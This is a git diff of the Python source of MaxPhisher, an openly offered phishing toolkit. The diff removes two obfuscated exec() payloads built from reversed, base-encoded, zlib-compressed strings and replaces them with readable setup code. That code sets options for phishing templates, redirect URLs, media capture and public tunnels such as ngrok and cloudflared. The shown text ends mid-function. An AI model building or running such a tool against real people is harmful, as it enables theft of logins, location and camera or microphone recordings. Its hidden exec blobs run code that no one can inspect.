@@ -1,8 +1,8 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : MaxPhisher
 # Author     : KasRoudra
-# Version    : 1.0
-# License    : GPL V3
+# Version    : 1.1
+# License    : MIT
 # Copyright  : KasRoudra (2021-2022)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://m.me/KasRoudra
@@ -17,80 +17,99 @@
 
 
 """
-                    GNU GENERAL PUBLIC LICENSE
-                       Version 3, 29 June 2007
+MIT License
 
- Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
- Everyone is permitted to copy and distribute verbatim copies
- of this license document, but changing it is not allowed.
+Copyright (c) 2022 KasRoudra
 
-                            Preamble
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
 
-  The GNU General Public License is a free, copyleft license for
-software and other kinds of works.
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
 
-  The licenses for most software and other practical works are designed
-to take away your freedom to share and change the works.  By contrast,
-the GNU General Public License is intended to guarantee your freedom to
-share and change all versions of a program--to make sure it remains free
-software for all its users.  We, the Free Software Foundation, use the
-GNU General Public License for most of our software; it applies also to
-any other work released this way by its authors.  You can apply it to
-your programs, too.
-
-  When we speak of free software, we are referring to freedom, not
-price.  Our General Public Licenses are designed to make sure that you
-have the freedom to distribute copies of free software (and charge for
-them if you wish), that you receive source code or can get it if you
-want it, that you can change the software or use pieces of it in new
-free programs, and that you know you can do these things.
-
-  To protect your rights, we need to prevent others from denying you
-these rights or asking you to surrender the rights.  Therefore, you have
-certain responsibilities if you distribute copies of the software, or if
-you modify it: responsibilities to respect the freedom of others.
-
-  For example, if you distribute copies of such a program, whether
-gratis or for a fee, you must pass on to the recipients the same
-freedoms that you received.  You must make sure that they, too, receive
-or can get the source code.  And you must show them these terms so they
-know their rights.
-
-  Developers that use the GNU GPL protect your rights with two steps:
-(1) assert copyright on the software, and (2) offer you this License
-giving you legal permission to copy, distribute and/or modify it.
-
-  For the developers' and authors' protection, the GPL clearly explains
-that there is no warranty for this free software.  For both users' and
-authors' sake, the GPL requires that modified versions be marked as
-changed, so that their problems will not be attributed erroneously to
-authors of previous versions.
-
-  Some devices are designed to deny users access to install or run
-modified versions of the software inside them, although the manufacturer
-can do so.  This is fundamentally incompatible with the aim of
-protecting users' freedom to change the software.  The systematic
-pattern of such abuse occurs in the area of products for individuals to
-use, which is precisely where it is most unacceptable.  Therefore, we
-have designed this version of the GPL to prohibit the practice for those
-products.  If such problems arise substantially in other domains, we
-stand ready to extend this provision to those domains in future versions
-of the GPL, as needed to protect the freedom of users.
-
-  Finally, every program is threatened constantly by software patents.
-States should not allow patents to restrict development and use of
-software on general-purpose computers, but in those that do, we wish to
-avoid the special danger that patents applied to a free program could
-make it effectively proprietary.  To prevent this, the GPL assures that
-patents cannot be used to render the program non-free.
-
-  The precise terms and conditions for copying, distribution and
-modification follow.
-
-Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
 """
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'25536A1730FFFBEBFB6A9E6A60662D76E328EB895783E0338EBD221DB65CACB8138281D98906783F7197CF3E71D7AE05B8B1D4C732C71EEA376EBB6C99C6A37B173AE17044D0F845091EB4B2353822F0576930BD2B0F0531307BEBC0DF15D95A247D8669AA50757793483E09BF39815788633B496405005A44AB5612E467AC5F4D52190D3A9963B272E38286C36578282CCEA416EF911478C9730ABE0D0732A820A8D4F81D4BC993E15ED28BD72F681344949907F5FCDECBB868697965E9D2BE207B16B7A933968C3C5EE1470ED77E1315783B26107B12FE650AAED8CBD709943D32A0E9599A1B2B0496A20F692BE9B7B3D27736BC956CC0A067A0D37A2D89E476772C20E20035FE35EA2991260AD20BDE2A6CAFA9907C1B4A89AC03E6BCAE08B274AC0F13E0BFE7B1C30A6240757153C5E6D60BEF301B960B2D1DB77D1C24081610C6199FCB6C9C500EC8B2A57F0634C0D3F1B43C7AF292779E654263D880D11F8FECC040B14D86A8AA8B016373B58000CA41002792F386821FDBFAF1056F3988F4234EBC3CAB74E9FCC2B2ECE9B08D3C8D345ED89B238356EC62371BA0D2B3BACAD40CBC321997F5B66E119547ED85F2C4A6BF41B60B92E2E79886CF6F7D849955D7E83917090C1591F0328D2C657A3EDD36FED62BD53F0B7BF2A36A0F8E5864AE4BF258E3888F0A585338CBC65060D1A3C7718282B37825DA35C3BAE598B531615B99B5CA71A346A660E74259FCC56BB78F3CED4FE3EB2E39FD3671957D43F425A648730C0BB7B0D9E773973B16B43F176FB8D75D79B1B07C6DA6C5152F5B4AE96F0E0FA69309EB7975579C49E601FE256422CCECB5D236833FEE5F44EA84E7CEC13D091B466D6FCADBC6D5CC9759543DD2EC5572B16EBFA5E6BB21E333A241E4E56564DD9AB6D261D1F9D329A6C3253B06F8D5BF3DC227497916351A4AFDA6099A4AAF765B1B5DB5954B19D0E626226BDD4E9D311DAAD1619FE563A7AEA3EEA87F846989BC43DDC1DD9732785CD291A91D11CF1B52F5F97D7F7FBEBE7F3F7F9FEFF89C13CA4621C028C4FBE178B7611864BBAF1D9EC229BD73DD3DF838C013B1E8D54951C987'))
+from argparse import ArgumentParser
+from importlib import import_module as eximport
+from glob import glob
+from hashlib import sha256
+from json import (
+    dumps as stringify,
+    loads as parse
+)
+from os import (
+    getenv,
+    kill,
+    listdir,
+    mkdir,
+    mknod,
+    popen,
+    remove,
+    rename,
+    replace,
+    system
+)
+from os.path import (
+    abspath,
+    basename,
+    dirname,
+    isdir,
+    isfile,
+    join
+)
+from platform import uname
+from re import search, sub
+from shutil import (
+    copy2,
+    copyfile,
+    copytree,
+    get_terminal_size,
+    rmtree,
+)
+from signal import (
+    SIGINT,
+    SIGKILL,
+    SIGTERM
+)
+from subprocess import (
+    DEVNULL,
+    PIPE,
+    Popen,
+    STDOUT,
+    call,
+    run
+)
+from smtplib import SMTP_SSL as smtp
+from socket import (
+    AF_INET as inet,
+    SOCK_STREAM as stream,
+    setdefaulttimeout,
+    socket
+)
+from sys import (
+    argv,
+    stdout,
+    version_info
+)
+from tarfile import open as taropen
+from time import (
+    ctime,
+    sleep,
+    time
+)
+from zipfile import ZipFile
+
 
 # Color snippets
 black="\033[0;30m"
@@ -109,7 +128,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.0"
+version="1.1"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -128,7 +147,7 @@ logo = f"""
 {blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
 {red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
 {yellow}{" "*31}             [{blue}v{version}{yellow}]
-{cyan}{" "*28}        [{blue}By {green}KasRoudra{cyan}]
+{cyan}{" "*28}        [{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
 """
 
 nr_help = f"""
@@ -148,7 +167,7 @@ lx_help = f"""
 """
 
 packages = [ "php", "ssh" ]
-modules = [ "requests", "bs4" ]
+modules = [ "requests", "bs4", "rich" ]
 tunnelers = [ "ngrok", "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
 extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]
@@ -184,12 +203,30 @@ for module in modules:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
-from requests import get, head, Session
 from bs4 import BeautifulSoup
+from requests import ( 
+    get,
+    head, 
+    Session
+) 
+from rich.console import Console
+from rich.panel import Panel
+from rich.progress import (
+    BarColumn,
+    Progress,
+    TextColumn,
+    TimeRemainingColumn,
+    TransferSpeedColumn
+)
+from rich.traceback import install as override_default_traceback
+
+override_default_traceback()
+cprint = Console().print
 
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
+repo_url = "https://github.com/KasRoudra/MaxPhisher"
 sites_repo = "https://github.com/KasRoudra2/maxfiles"
 websites_url = f"{sites_repo}/archive/main.zip"
 repo_branch = "maxfiles-main"
@@ -241,8 +278,340 @@ else:
 
 print(f"\n{info}Please wait!{nc}")
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'=IOK2AO4BY772VD77PVMRGJQLA53TLVJRWUAIITWY57WZNDJIUIGUAL6QCQ6JUSNNIYBDZ5K5DHZVJI3Y6CWD72NP376LMBVMB7724QLQCHP6MALHOGBPGZQFAOBDSKKHAIFHFYQG26SOKAYURTG7QIYUH4SXCMAWABN6UCVMIX2QXDCTGQAEX7JUA3LEYH4EX5B6YO5XFZHY3KM2YYECRVOIX5AUKRULROS7DTUYFSBAYXJ4PDQUWUEL7A4YGYM4BUCQGWP56TBJ5AB67D4OR5AJYYMCWMFS5ZPJPHUAFM2VZBAUGQC3XRHSU3VOAY6P5O4EE43EDNXWCLA65X5DFU33R7PXWOCQK5NURWXTVYUKK5FVGSZHR3TRFS5ODPMK7L3V2AHL7HB2V5ZVUZLTG4ZI223ACGPIMJ2VQPCGHTNCILA2HENFCQOVPYBVYEQUJ45WD2KK7JA2PY4QQ6H2UY3DMMBOSAGQO4K747KSXF3G47GL4FIMC6ULZJXXKEGNW5UPYVHSNU5YGPMKF2ZZIYMKPUALURZKOUHISI2MJQZYHSVTYTCZSX4O42ZIAPOA3P2DGCCNFA2TKCMWG4SXXLBMYP3BXKVBKEGPZXG5U3GNYF6FPMB27DJ6PD47ZVSNOM4KSK7YBXLZG6GZBT4LZJC6ER6BVA25ZLBH6RFJ34KORE5NY7MOBK64SR5R6DMRG27SUA22FQ3D4PAPVBSGPNMPR5PG7S2O5H5REJ5HEB5GBGBSKSULMELKAS7WFJ675OUIBMUBKKYHXGWIDMW4YLMSI45322LADCV5B6JVNI6EJPUXAYCQPSLZBAIJDMR35J6FKVVBAK6LMNVS4YWPX7SJ2B6QG6ZCYUFA57HZASDQX26VWWO6OCRPBLB7AI6FNY4VCUSKT5X7GLXYEJ5HLJJK6A62C5MEIEQ73YBBSYK4N5XFWVZUBN4H5JQXA7XO2B2BDG25RXBUXSDXLW62H3PMWH62TSC23QSKJ7VRIP2RAWPDANK64HVOM6OROBDBLMV3O2Q5JYE3ZGV4PXYLDJYEUW3QJLICG2TFZL74J5W6YVUXXTBKQZQTGANJHX7ZZ24DWDKKIXDE6SK4GN34FBKAOAH54TPI5LW3AAH4QLG42OHVHI7U4DIHRAQLYUR4QKFPYGR2JLA6THY6VYV2RIZXO2IKJNJ5KSJ253DRGWFQ3LR5GRAYCHYV5QZXRNDA34ODLCXF2DO7GAB6GSPSICGBJ3XUV55EL5VUKEMMPWMPPIWFSLMWK3P57IGD2X3RBG6JBZTFNDKXHNJ2DKC4MBJ2WTI5P5MP5FKNX2A2IZJCKRH5NL7VRKW4J7Y7XENQ67U57V2Q7TXT2NIS3QRSCTO6TKO4UORCG7B5KSYJ6IHMUCLXXHDQIATWI7QAICVKUK4BW4RJKBXEXYQGSMQPHYV25FB6J6JRB4DQPHMXXA3QGOUC34MQA5L46GTB4EP6SQESFIE3DMFBMNCGKTPVXSNAZYBYA7XYD5DBKLP24QPQDQBPJWDSCJ7OMGY2JZXNPEVU5M2BZ6VGBNID4YEWLYV2CINMNRH32V3GYX7AQ66AJMDJXZXHCYMJV5V4KRPAA6XOLHQ55QDXMZHZ32H4YDNPIWD4VENASLSWMR3Y6BIJEVAHT2U23J6LPH3VNQNLTLENHYSFECQTEARLZRU6TOMBXI2RFGU5VTWOAPGFHJSF2J5LDBEUOMED4N6OJVWZOFU5TAVZ3UAONUAKWOZQM6ONOXDIPW67IHIQAAQIGEA67YGQCIJPSYG3XG6YX5UV2Q3WV5GE7DOEUN3EY74GSXYSXXYEP2MGRQ4XCR2HUMYK2MDTSYD3CZZ4AWHLG7TBMKAAHYA47KS6E4SREYAAB2PTPNZG6XAO5ZA5JDHPJKY3WLISPUQLS4MEII366BTDZ6H7ECIZ7PS5M34WZZEETSTKARPVK7BSAHRU7I5ZL5G4H6H7NZQBOAIGNAL3NG3RYCHN4OW2E55ZO4XLAXS4VRFPBUUSZQPOUOJQ4RJJI4VQXIOAU7TU2BTUHC4IYZO6GIB7M4P32333WQYFAANSDHAW6SGXPNRVO7SPS2TJGK66RPCBEXSIUYDIGUKPIHNH5QU3QKPDGOTUVYY56H7Q7SIDGJ5RNEOOAVRZTFKZSEZYHNJ45MGUZGQKY6CYUEIWVQYLNKD6OH5Y6CHXIIYMDYSBKD5QCILNYY4KR2CHSKMPLXXUXFMIFJ6NVZR5YD7IZLNNZ7WHSEOKZRYP7HKJLPDAXXMZMBOUY6VCYSPEB73CAAEZ3AF2MVDQUNUFTDDOJ6DCJVV3XPHKLHECEVJTCQWAMNVE2PBO4MY47JQE6D36NKOUBO4HYF7P7IXQDTAYOGWPQOAOC5MLA5PFNTN4DES3T6LQP73LDSBIOTCUYD2QTX4LGSKV6U5VDBGQR2TSMHMUVBWWXQS22RKBV64ZZ3FYX4F35U5MVXMHJPQJAYYXXXJB73MNSYCQPAPJK6XX5MDJJ7OELS4HJP7BNFFQYAKSK6DYSAMNITMSCRXXH7KGBJGMHHPSA467FRASBVTGE5ST35KW3Q5EWWDS55HJGWX24P77WCYWL2DK6QQAPWK7ODFNTZCQEKWPZPAE2PBFTOIFM3QGYCTG7KTFZ44JV4VR6GS42C2CZL6NP6ELQD4XRZYVVXLRI4PQ3WCZKNHYCGE7NYB3BXAP4ISJ2CRINKTGE65BY53HOBOCJP2XCJPSRCYRQELBA3CSJXU22CH5AALEAAR2HB3OAGX45ZKVNQNX3DSX6N4OMMINJMXPKGFPDJ23Y5FZ2OQMDCAS4F3NOYR25ZAIQREGOMMEGAAKBYFOCF2USJIDNRXC4LCIM3CQMLKCBKR4KWVRYQWIWNNHACKYMK3YSDS4HL2KOQEFTR3SQTIVYCICYFDK6XRP4FLABC7D34CAU7QVAO76GP555AGCU2HOGVRR6TR2SHIBUD5RQC4DDUDBBKIARX7TYM3QCN5QHVKEMFCSAKA5AGEMSBZMDPHIOTE2X63GEEKSU647GPIY2UYMV4BEUAO3QARXHAKM5XD26LRLF7YFJHUGSKJJBQJLLDUV5FI3HRUAEF5M3D2K57BKVQXUZWHJDESEVKXZCCD3BIJ6XJYXTA34BWITYCVUKXVYSOVRVI576UN4VIAMQB57HQF73D66ILTDLZOA26S4CR467ZZTMUWBFZAXARFA67IMJSXVC6LJKCBPRNXP3LM37ORBIKQENUUYQZ32VY5H5QWA2J7QNIW3CUHPC5WJQJDMGK4QUSW7562ZP7SMDEEEMGBNHDSROKHAQJQPJLU6HAM3DAQXA65EJE2FYRFPDEQ2URTC2TRFKVJ5W6QXRD62NL37RP2D3QY7W5IH7DJJWBILNQXWPETFEWJEUU6HNTBZL7K26PDFFGL5ZQNJ7DLHM42GASTVKTAUMQUIAK4SKE7UHOKHSDT4RKYATL5K7254VVXC5GABBGMDCTQLYDU3XRBBAIIZRNKGYZUPSWOA7M2QK4BRBHJ5U4ZFHXTV2ZESAT3PNGPEAYDDYQQVGXCV4FBK4RPV2PMRKEOGVV5TXX3TDNNHFMRMRUEBK5JKJ5WPQC7Y3OU4TJERDI3ZVQ2AVVWYKDKSHAZ4MWQLL7A35B75Z6K3HUJFMKAOV4G3MWQJH35BAJUTU7VD625O5N7YEYU2VMZVMSLHWEYA32SBD3LSMIZBU3T7BASRKYOHJA22LWI64XWMMY7KJH56TA2LM5DFVPKQQV7ZWC42Z2DHUBCO2PVJ24WEPMLS6VC426H75V5L6QIKRSPPHUCZ37VWWZNLZI6GNORJU6EDFQVWJOI4QXROA3LTEZ5OX6QVRHVV5LANV7UHJKLFIYQU3MS4SK5NF4OHWSMU3HWTDILIIE5IAAHNUSSOQWTB6WJLO52ZRO2N7FMBFOC46YUSIRPHFIXH5CMFGFZ3F7XMNIWKIDKYM2D5XCV4PUCKUMAM3DUYCBA244GIPDEL5GZWG4XO2HGXK6OWTVUXNAZQAXLNTCNDE5TMKTRGMRWDOCD6F6PKENHULGNHRT6ZS2UR4OI7OV6UTJVTKUZXIKZ6MVZI6UTV6WQQFEL6UMJPBDTIT7SUWHFNKGRTV3FPHDIQPO4ZL5J2KAZXECMUKS2YBVW27ECPCGD2DYOO7IZUGA3EELOY45MEGI6U4WJ7MQWJHN72WJFFMF6NHE3TO2MB3MWRDMK7DLQISEUTGRUI2ZBBH64YAAIE6QFRGFNOXOPQFDC4XBDCEJWIYFWJKTZDW7IKTE5OCA7RKU2YRLTH5RJEZVQSHQX3SPMRG4V55TD63IP5BKHEJQNV5FDSMUCO62YF76CTT36KPIQPB4EBWDJFEDTHKPZOZEAH33EP6AMTSBPEQZH5GKYEV7CTUB7XWM3WTAO3Y5Q4BAUD7DJNEJWN5O6JW4JZSXA7FNDJ6S2M2LXWSAYWIQPA6POVHWP4UBJK5WQXS5BGTZ7BG2HJVPTBJPADZ3UWFXBUSVGE2GKU57XVKHWSGE6254XZXRMXQNC5B2E4W4IIFNXJYGQDRF6O7DDICX7IECVXUSLU2PRBRMUZH6RO6E36FZZFBY5BWH7G5EF6RJ5B6FXYMFCKODP6BJNLTMT7OV2ISYVJ6BKWTCQAQYMTLAGYZVCNSQAW5TCRHMNMODSB55QWGE7EGP7VWL6DB6CHIOCLKLJPUVRBXQO5I4YACPHOD254MPZYJLFFIOLEWGX4JSEL4CYPLBKWTHA6YNRZFZDHSXXHYTDEJEPXXLPYQTSV2ZYBA7JU263ZU4LYVF5CDXMECJRRL6SDQQHQYVZIALILJQ6XQI4XNGHXXC6SYZZKR6NPTXC2BDSUFKPDIBRHM5CG3KPESK3EFC4NJCKIVXX5MXU6743UM4YMS55SJSZMZLRJA4MUGVKXA2MLFSWTGMA7IVAGXA25SR5LDB7P5YY34HQQMSZQ5CK6QQVKESZT6OX7JLFLYARSOSQ5RVUJV757QR4RNJ3K24TLHUD33SAR6AD4KCWRT74S3SGHXPDQUZGY2B6OKCW7WZXNV5EVNQBEMCS3GFZQYGWV33MSLI6FONBGEVJPT4VRGHRVR4SEW5R2W5R7OY2G6UK4GJ5A3VBPWXO6B5FNXRCGQHQNWJFAZP32BCK6VWOVNFZ5DSGU6XBXRGL6DYZDBOAFGMBQWVSGR7IYFG5FCOKPJBXO52KKKG6H2O55EGH6WXX5A45DELWWIHEUOTCU6MIDRYX3OHOW3VPVPJ4IXZKZS4644X65CYPN4K56UUYPSDYN66Q4UQDNPO4BJPEXEHCILPRULW3RWYWNQ2W4QQNXORRZOTG7PRV5QRWETXY2PMZ44O2T43LCX3GSQ2Q3RRECFFAUOPTI4UGBVXJEIRYBG75TMKC4BGWKA2X3WC6NW3AXHJSWTFVHAW5UZBNIWBE37QYNF3JF63EELQEWAO3ZZCCWPZSTSZARWQQ6YQQ4DT43JTTHDBRIS455TBAC3UIL57HYQ5PLVK6KPTJI5ILELZ6E3NE4OXGSEJ5TAPKN3K4VED5YKMDQOGE6DQ5B4AV4ZRM4RY3TGL75VJ4TA4BGLS75EPM6DVNNQVWDRELEFW6YEK2LYH5VQFDMOFMVX3YWAYWCXVXQX3FKMMD5VQ5ELFZOOWAIZDSD7M3SVA4D32J6NEW63L4KVGFD5ETANLMLEBMDJGYG7EXQSFENBBV6GNW2NR37AWPKL6EZQPXZWS3WM37H7WJPDOTUIXDRXJ3IVJZUOMLGU5QG4OEBVS4WNH7WBC73QVG7DOGSB7X7MJ7IR4CMB3WRCMVNE4PFI6FWYAR5IBTLHEL447FJGM2MR2YTZMPMJF7FFVIIVORTZGIFIGDYNRK3N5ULMYVPXPLYHOAA3VOCXI6AL6D7ISMHZCDJ2RZMYLXQ7QEVUZKLFYLMHUSG77LHPL7GWHTWMO3JUTWQQCGR2MJAW3HWFZOISM76KMALTEY6CHASLRPMVV7YFUZQSHHPBDIELG76D25ZD6FX4LANQ45JW4DEDTJUOEWMW555Y62EYJSIGA74YW4CP25FDBWNF6SB73D4I4LOZS4XTPT3IJ5SRDOSF53CSYSBJDADLTYT6DEKXZ2PXAGRZBSY7NFOMEYFMXHULIYUFZXOVX5ZQP6BRR4NCLPVEV2OUC5THGW233DZ4JQSIN73B22RULSA544FQJV2GEQQF6GUUI5KLB6XIM4PHEBXUQ6BCYQKKA55H6XVHBOM4DV2XNNROY5RL543N3NYGW3TTTC4AWD36YVFRAOI43LNEIBNXJACMB4EX7VX76WKYOOVXPDM6ED4KSZ5K3T7PSUC75QLFARZKMZ5XM5X4C6QTSDGSD7PBVP5YEMEZNMPJE7UQ3GM73FUFHTJBTS4ZVZ4ISQM4U2VXHKJESHALGIHS43FNPD7UKGMGD54ISUI2QLEBX6HK5WGAUW23LNL4RDOAQOWFUNBSKBXXU5LWBNRNXFV4DFKHDB357QR62BPFEVUQCL4ZH7IOZRMXRNQZG76M3QFSYKKUHLMH42SQCN5ZZKPQCGZJPHWEHL2AXCZTXSP7IXVMGFXHJ2R5CBTURFWYMYTHKOK6F6QU6GWGSQI3HJIDPK7FGEZ46GUMY2BPYFOSW6OZTY3GGANX5XSLORSRRQCEX7Y5XJFWHOJP3EMKMJ4BRW46R76JFZN4IMS6WUNL7VDNIB7BHYPM4IGCAWD5EHAVZRL66ESYOEXLOUPCAUEEXXRPGWHDTRAX7FKCLM7NOXQ2FXN6NL5GSA42X4HALLBZUV3CUJM5ACN5HZGK7NSHB4SACPCPXFYWYGMUMYQ4R4WWMETWSQSD4RS6IY24TQGCMMI7ET6Z7YVOZ4QG6L6D7XUOGMOPQXYXVVFF2LPQ2RUHCZEEEG2FJQHGRE5MX7M7MF72G3GZZIRPFLAO5QYIFJKSOH5C6Y63HUYVKGIYDF5XRVGLN37LAE6TLFIYKUP7N5NQX5754LHZAEKYWIQANI6NWZ6WVKBGCN2SUJAULRHW4P75ZI6WUFLNE3LTVPGZQYL64C2ZRVZZYV54OR353CSHHZOF763EOXSHCZ4FTSNQNALG6AEAQSUS5NJTOZINUKH456REEK4EY4E4JZ4T6OULZ5BEX5WZYWAR5MSRCXUUQUWJWAVKRDPRHCI4S4T47WO7ICXOQBQBKFEHHNB2WOR3HVL7YPELMNG6GW756W4AWWXH5FHATHXKTHL66XJCLIHRWXTUJX54K5XOSIBNRKQYIGSGP5FVX27GYU22FZHE74VFABOJFHLTVWBMWZDEUL434XLWUKCFGR34XB5KPFEBWGEWI2M55R3MOK6FLOBNR4YO3OEX2FOWZPJDR5IME7KEXRC3VY2UIMX5WGCX2PDD75TVLCKXXW5GHDBXGKXS5ODANOJSHCSDGECK55NJNXRYQ3H7RLXWUXQMCRIJJ76M2IJOLFLEW6PKPASSWYZW6ZAE2CVULPXVSXOSZP64LZ6OFGJYUCZY2YQWJN65PBR5XHSUMOPRTWVJYSG53VHREWSTW4NY3XVXCBL4RPBYO5HEZ57R4YRSPZDP23GXPLS6ZOMPLJLT53JSBQM2FTO4GIWH2KW5POXFZ5XKEHXPXEXJKRIUDCU55SUHWRDRQOXUL2XG4BLGCL6EP7N5KL5CQJ4QTGIWDSTONBXYH5RDFOFS3XTCLTEMUXKCBMC726U3IFMU37TSKT2VK53LIL27CG47ECBJU7IX7EB76CZ3LN5MSLWBR46NNIYYUY4NJ32MDP7WY4A3SLLTGW2FA34B72JON3FVJFVIJNJWM4VQ7CF5ARUQ33PK3X5CZ6RVTJUQE4OMOLTRWIM4D7AL2XCW3V6XHK2RW2DHQSCLPLV5G5FSZDB3ZFE3FDNCJZE7NWQZFBVPR2H4V33NB3T2Q7BDDMBDH2EZKPFJ65IK53ZB26T7W54LBBCW4V7AJ2SDKMO56G3E7DCLOX2IXRJUTHIGHXJ65SXGNLBB3VK7Q2GRESG6SOWKMSYOY3J77EL2X3FWPU7OK6OZL25K7L3TZ5ROVFUB2FOJ3QETVNV4Z53YOKVC3S5HIJIORFOO244HXUZ3PDLD77XPP627773HP6Z777TXH77HP47QD4QJS6FGHVVNZ6VKE6Q65M5ENTNSBJCBYIEZAATWMFM4W25J7REKEQ3SLSJCG3BOCP'))
 
+default_port = 8080
+default_tunneler = "Cloudflared"
+default_fest = "Birthday"
+default_ytid = "6hHmkInZkMQ"
+default_duration = 5000
+default_type = "2"
+default_template = "1"
+
+
+if termux:
+    default_dir = "/sdcard/Media"
+else:
+    default_dir = f"{home}/Media"
+if not isdir(default_dir):
+   mkdir(default_dir)
+
+argparser = ArgumentParser()
+
+argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"MaxPhisher's server port [Default : {default_port}]")
+argparser.add_argument("-t", "--type", help="MaxPhisher's phishing type index [Default : null]")
+argparser.add_argument("-o", "--option", help="MaxPhisher's template index [ Default : null ]")
+argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
+argparser.add_argument("-r", "--region", help="Region for ngrok and loclx [Default: auto]")
+argparser.add_argument("-S", "--subdomain", help="Subdomain for ngrok and loclx [Pro Account] (Default: null)")
+argparser.add_argument("-d", "--directory", default=default_dir, help=f"Directory where media files will be saved [Default : {default_dir}]")
+argparser.add_argument("-f", "--fest", default=default_fest, help=f"Festival name for fest template [Default: {default_fest}]")
+argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube video ID for yttv template [Default : {default_ytid} (NASA Video)]")
+argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
+argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
+argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
+argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
+argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
+
+
+args = argparser.parse_args()
+
+port = args.port
+ptype = args.type
+option = args.option
+region = args.region
+subdomain = args.subdomain
+tunneler = args.tunneler
+fest = args.fest
+ytid = args.ytid
+url = args.url
+directory = args.directory
+duration = args.duration
+mode = args.mode
+key = args.nokey if mode != "test" else False
+update = args.noupdate
+
+local_url = f"127.0.0.1:{port}"
+
+# My utility functions
+
+# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
+def is_installed(package):
+    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
+def is_running(process):
+    exit_code = bgtask(f"pidof {process}").wait()
+    if exit_code == 0:
+        return True
+    return False
+
+
+# Check if a json is valid
+def is_json(myjson):
+  try:
+    parse(myjson)
+    return True
+  except:
+    return False
+
+
+# A simple copy function
+def copy(path1, path2):
+    if isdir(path1):
+        if isdir(path2):
+             rmtree(path2)
+        copytree(path1, path2)
+    if isfile(path1):
+        if isdir(path2):
+            copy2(path1, path2)
+
+# Delete files/folders if exist
+def delete(*paths, recreate=False):
+    for path in paths:
+        if isdir(path):
+            if recreate:
+                rmtree(path)
+                mkdir(path)
+            else:
+                rmtree(path)
+        if isfile(path): 
+            remove(path)
+
+
+# A poor alternative of GNU/Linux 'cat' command returning file content
+def cat(file):
+    if isfile(file):
+        with open(file, "r") as filedata:
+            return filedata.read()
+    return ""
+
+
+# Another poor alternative of GNU/Linux 'sed' command to replace and write
+def sed(text1, text2, filename1, filename2=None, occurences=None):
+    filedata1 = cat(filename1)
+    if filename2 is None:
+        filename2 = filename1
+    if occurences is None:
+        filedata2 = filedata1.replace(text1, text2)
+    else:
+        filedata2 = filedata1.replace(text1, text2, occurences)
+    write(filedata2, filename2)
+        
+# Another poor alternative of GNU/Linux 'grep' command for regex search
+def grep(regex, target):
+    if isfile(target):
+        content = cat(target)
+    else:
+        content = target
+    results = search(regex, content)
+    if results is not None:
+        return results.group(1)
+    return ""
+
+# Write/Append texts to a file
+def write(text, filename):
+    with open(filename, "w") as file:
+        file.write(str(text)+"\n")
+
+# Write/Append texts to a file
+def append(text, filename):
+    with open(filename, "a") as file:
+        file.write(str(text)+"\n")
+
+
+# Print lines slowly
+def sprint(text, second=0.05):
+    for line in text + '\n':
+        stdout.write(line)
+        stdout.flush()
+        sleep(second)
+        
+# Prints colorful texts
+def lolcat(text):
+    if is_installed("lolcat"):
+        run(["lolcat"], input=text, text=True)
+    else:
+        print(text)
+
+# Center text 
+def center_text(text):
+    lines = text.splitlines()
+    if len(lines) > 1:
+        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
+        new_text = ""
+        for line in lines:
+            padding = columns + len(line) - minlen
+            if columns % 2 == 0 and padding % 2 == 0:
+                padding += 1
+            new_text += line.center(padding) + "\n"
+        return new_text
+    else:
+        return text.center(columns+8)
+
+
+
+# Print decorated file content
+def show_file_data(file):
+    lines = cat(file).splitlines()
+    text = ""
+    for line in lines:
